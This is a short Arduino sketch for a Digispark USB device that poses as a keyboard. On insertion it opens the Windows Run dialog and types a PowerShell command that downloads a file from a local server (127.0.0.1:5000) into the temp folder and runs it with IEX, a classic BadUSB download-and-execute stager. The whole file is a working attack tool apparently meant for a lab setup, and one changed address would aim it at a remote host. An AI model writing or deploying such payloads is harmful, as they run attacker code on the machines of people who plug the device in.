#include "DigiKeyboard.h"
void setup() {
  pinMode(1, OUTPUT);
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(10);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("$p=$env:TEMP+'\\p';IWR 127.0.0.1:5000/a/p -O $p; IEX $p\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  digitalWrite(1, HIGH);
  for (;;) {
  }
}


